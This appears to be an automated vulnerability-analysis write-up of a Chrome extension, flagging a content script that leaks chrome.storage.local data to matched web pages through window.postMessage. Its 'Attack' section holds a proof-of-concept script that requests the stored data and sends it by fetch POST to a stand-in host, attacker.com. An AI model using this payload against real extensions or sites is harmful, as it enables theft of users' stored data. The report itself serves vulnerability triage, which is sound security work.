# CoCo Analysis: aajfadplooajoiepmofheifpbbhdakoa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (storage_local_get_source → window_postMessage_sink)

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/aajfadplooajoiepmofheifpbbhdakoa/opgen_generated_files/cs_0.js
Line 418: `var storage_local_get_source = { 'key': 'value' };` (CoCo framework code)

The actual vulnerability exists in the original extension code after line 465.

**Code:**

```javascript
// Content script - Message listener (cs_0.js)
window.addEventListener("message", function(event) { // ← attacker can send messages
	if (typeof event.data.method != "undefined") {
		let method = event.data.method // ← attacker-controlled
		if (method == "get") {
			chrome.storage.local.get(key, dateResult => { // ← retrieves storage data
				let messge = {}
				messge.method = "result"
				messge.result = dateResult // ← storage data
				window.postMessage(messge) // ← sends storage back to webpage (attacker accessible)
			})
		} else if (method == "delete") {
			chrome.storage.local.remove(key, function() {
				console.log("remove")
			})
		}
	}
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// Attacker's malicious webpage code
// This extension runs on specific Chinese e-commerce sites
// Attacker can inject this code or host it on a matching domain

// Request storage data
window.postMessage({ method: "get" }, "*");

// Listen for the response
window.addEventListener("message", function(event) {
    if (event.data.method === "result") {
        console.log("Leaked storage data:", event.data.result);
        // Send to attacker's server
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(event.data.result)
        });
    }
});
```

**Impact:** Information disclosure vulnerability. An attacker-controlled webpage on any of the matched domains (*.dmc.com/*, *.yea3.com/*, *.okeysc.com/*) can trigger the content script to retrieve and leak stored extension data back to the attacker via window.postMessage. This creates a complete storage exploitation chain: attacker triggers storage.get → data flows back to attacker via postMessage. The attacker can exfiltrate sensitive data stored by the extension.
